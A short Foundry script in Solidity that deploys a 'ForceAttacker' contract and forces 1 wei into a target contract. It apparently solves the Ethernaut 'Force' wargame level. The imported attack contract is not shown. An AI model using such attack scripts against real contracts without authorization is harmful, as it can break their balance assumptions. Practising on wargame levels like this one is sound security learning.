// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/Test.sol";
import "../src/ForceAttacker.sol";

contract ForceAttackScript is Script {
    function setUp() public {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PK");
        address targetAddress = vm.envAddress("FORCE_ADDRESS");
        vm.startBroadcast(deployerPrivateKey);
        ForceAttacker attacker = new ForceAttacker();
        attacker.attack{value: 1}(targetAddress);
        require(targetAddress.balance > 0, "attack failed");
        vm.stopBroadcast();
    }
}
